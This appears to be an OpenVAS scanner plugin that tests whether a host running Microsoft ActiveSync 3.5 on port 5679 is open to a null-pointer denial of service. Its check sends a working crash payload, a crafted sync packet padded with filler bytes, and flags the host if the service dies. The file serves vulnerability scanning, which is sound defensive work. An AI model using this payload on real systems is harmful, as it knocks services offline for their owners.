###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_microsoft_activesync_dos_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Microsoft ActiveSync Null Pointer Dereference Denial Of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to cause denial of service
  condition.
  Impact Level: Application";
tag_affected = "Microsoft ActiveSync version 3.5";
tag_insight = "The flaw is due to NULL pointer is dereferenced in a call to the
  function 'WideCharToMultiByte()' while it is trying to process an entry
  within the sync request packet. This causes an application error,
  killing the 'wcescomm' process.";
tag_solution = "No solution or patch is available as of 27th September, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.microsoft.com/en-in/download/details.aspx?id=15";
tag_summary = "This host is running Microsoft ActiveSync and is prone to denial
  of service vulnerability.";

if(description)
{
  script_id(802462);
  script_version("$Revision: 12 $");
  script_bugtraq_id(7150);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-09-27 14:28:19 +0530 (Thu, 27 Sep 2012)");
  script_name("Microsoft ActiveSync Null Pointer Dereference Denial Of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/44696");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/8383/");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/11589");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/8383");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/315901");

  script_description(desc);
  script_summary("Check for the DOS vulnerability in Microsoft ActiveSync");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_ports(5679);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


## Variable Initialization
port = 5679;
soc = "";
sock = "";
req = "";

## Check for the default port
if(!get_port_state(port)){
  exit(0);
}

## Construct the attack request
req = raw_string(0x06, 0x00, 0x00, 0x00,
      0x24, 0x00, 0x00, 0x00) + crap(124);

## open the socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

for(i=0; i<3; i++)
{
  sock = open_sock_tcp(port);
  if(sock)
  {
    ## send attack request
    send(socket:soc, data:req);
    close(sock);
  }
  else
  {
    ## If socket is not open service is dead
    close(soc);
    security_hole(port);
    exit(0);
  }
}
